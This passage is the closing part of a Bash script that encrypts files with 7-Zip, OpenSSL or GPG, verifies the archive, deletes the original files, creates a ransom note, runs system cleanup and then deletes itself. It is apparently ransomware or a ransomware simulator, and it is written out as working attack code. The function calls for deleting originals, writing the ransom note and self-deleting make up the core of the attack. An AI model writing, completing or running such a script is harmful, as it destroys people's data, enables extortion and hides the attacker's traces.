            echo ""

            # Verify GPG archive
            if verify_gpg_archive "$PASSWORD"; then
                archive_verified=true
            fi
        else
            log_error "GPG encryption failed"
        fi
    fi

    # Check if any method succeeded
    if [ "$archive_created" = false ]; then
        echo ""
        log_error "============================================================================"
        log_error "CRITICAL FAILURE: All encryption methods failed!"
        log_error "============================================================================"
        log_error "Attempted methods:"
        log_error "  1. 7-Zip (7z) - Failed or not available"
        log_error "  2. tar + OpenSSL - Failed or not available"
        log_error "  3. tar + GPG - Failed or not available"
        log_error ""
        log_error "No files will be deleted for safety"
        log_error "Please install one of the following:"
        log_error "  - p7zip-full (for 7z support)"
        log_error "  - openssl (for OpenSSL support)"
        log_error "  - gpg (for GPG support)"
        exit 1
    fi

    if [ "$archive_verified" = false ]; then
        echo ""
        log_error "============================================================================"
        log_error "CRITICAL FAILURE: Archive verification failed!"
        log_error "============================================================================"
        log_error "Archive was created but could not be verified"
        log_error "No files will be deleted for safety"
        exit 1
    fi

    # Success - proceed with file deletion
    echo ""
    log_success "============================================================================"
    log_success "Encryption successful using: $ENCRYPTION_METHOD"
    log_success "Archive: $ARCHIVE_NAME"
    log_success "============================================================================"
    echo ""

    # Delete original files
    delete_original_files

    echo ""

    # Create ransom note
    create_ransom_note

    echo ""

    # System cleanup
    cleanup_system

    # Final summary
    echo ""
    echo "============================================================================"
    echo "Operation Complete"
    echo "============================================================================"
    log_success "Encryption method: $ENCRYPTION_METHOD"
    log_success "Encrypted archive: $(pwd)/$ARCHIVE_NAME"
    log_success "Password: $PASSWORD"
    log_success "Original files have been deleted"
    log_success "System cleanup processes completed"
    echo ""
    log_info "To extract files, use one of the following commands:"
    echo ""

    case "$ENCRYPTION_METHOD" in
        7z)
            echo "    7z x $ARCHIVE_NAME -p$PASSWORD"
            ;;
        openssl)
            echo "    openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$PASSWORD -in $ARCHIVE_NAME | tar -xzf -"
            ;;
        gpg)
            echo "    gpg --batch --yes --passphrase $PASSWORD -d $ARCHIVE_NAME | tar -xzf -"
            ;;
    esac

    echo "============================================================================"
    echo ""

    # Self-delete
    self_delete
}

# Run main function
main "$@"

# Exit successfully
exit 0
